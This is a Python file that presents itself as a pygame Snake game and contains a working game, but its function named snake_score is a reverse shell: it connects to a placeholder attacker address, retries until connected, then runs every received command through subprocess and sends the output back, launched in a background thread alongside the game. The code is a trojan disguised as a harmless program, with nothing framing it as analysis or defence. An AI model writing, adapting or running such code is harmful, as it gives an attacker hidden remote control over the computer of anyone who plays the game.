import socket
import subprocess
import os
import time
import random
import threading
import time
import pygame

def snake_game():
	pygame.init()
	white = (255, 255, 255)
	yellow = (255, 255, 102)
	black = (0, 0, 0)
	red = (213, 50, 80)
	green = (0, 255, 0)
	blue = (50, 153, 213)

	width = 600
	height = 400
	display = pygame.display.set_mode((width, height))
	pygame.display.set_caption('Snake Game')

	block_size = 10
	snake_speed = 15

	clock = pygame.time.Clock()

	font_style = pygame.font.SysFont("bahnschrift", 25)
	score_font = pygame.font.SysFont("comicsansms", 35)

	def Your_score(score):
		value = score_font.render("Your Score: " + str(score), True, black)
		display.blit(value, [0, 0])

	def our_snake(block_size, snake_list):
		for x in snake_list:
			pygame.draw.rect(display, green, [x[0], x[1], block_size, block_size])

	def message(msg, color):
		mesg = font_style.render(msg, True, color)
		display.blit(mesg, [width / 6, height / 3])

	game_over = False
	game_close = False

	x1 = width / 2
	y1 = height / 2

	x1_change = 0
	y1_change = 0

	snake_List = []
	Length_of_snake = 1

	foodx = round(random.randrange(0, width - block_size) / 10.0) * 10.0
	foody = round(random.randrange(0, height - block_size) / 10.0) * 10.0

	while not game_over:

		while game_close:
			display.fill(blue)
			message("You Lost! Press Q-Quit or C-Play Again", red)
			Your_score(Length_of_snake - 1)
			pygame.display.update()

			for event in pygame.event.get():
				if event.type == pygame.KEYDOWN:
					if event.key == pygame.K_q:
						game_over = True
						game_close = False
					if event.key == pygame.K_c:
						snake_game()

		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				game_over = True
			if event.type == pygame.KEYDOWN:
				if event.key == pygame.K_LEFT:
					x1_change = -block_size
					y1_change = 0
				elif event.key == pygame.K_RIGHT:
					x1_change = block_size
					y1_change = 0
				elif event.key == pygame.K_UP:
					y1_change = -block_size
					x1_change = 0
				elif event.key == pygame.K_DOWN:
					y1_change = block_size
					x1_change = 0

		if x1 >= width or x1 < 0 or y1 >= height or y1 < 0:
			game_close = True
		x1 += x1_change
		y1 += y1_change
		display.fill(blue)
		pygame.draw.rect(display, yellow, [foodx, foody, block_size, block_size])
		snake_Head = []
		snake_Head.append(x1)
		snake_Head.append(y1)
		snake_List.append(snake_Head)
		if len(snake_List) > Length_of_snake:
			del snake_List[0]

		for x in snake_List[:-1]:
			if x == snake_Head:
				game_close = True

		our_snake(block_size, snake_List)
		Your_score(Length_of_snake - 1)

		pygame.display.update()

		if x1 == foodx and y1 == foody:
			foodx = round(random.randrange(0, width - block_size) / 10.0) * 10.0
			foody = round(random.randrange(0, height - block_size) / 10.0) * 10.0
			Length_of_snake += 1

		clock.tick(snake_speed)

	pygame.quit()
	quit()



def snake_score():
	host = "<YOUR IP>"
	port = "<PORT>"

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	res = sock.connect_ex((host, port))
	i = 0
	while res != 0:
		time.sleep(3)
		res = sock.connect_ex((host, port))
	if res != 0:
		exit()

	sock.send(f"\n$>".encode())
	while True:
		command = sock.recv(1024).decode()
		if command.lower()[:4] == "exit":
			break
		if command.startswith("cd "):
			try:
				os.chdir(command.strip('cd ').strip())
				sock.send("$>".encode())
			except FileNotFoundError:
				sock.send("$>".encode())
		else:	
			output = subprocess.getoutput(command) + "\n$>"
			sock.send(output.encode())
	sock.close()

if __name__ == "__main__":

	t1 = threading.Thread(target=snake_score)
	t2 = threading.Thread(target=snake_game)

	t1.start()
	t2.start()

	t1.join()
	t2.join()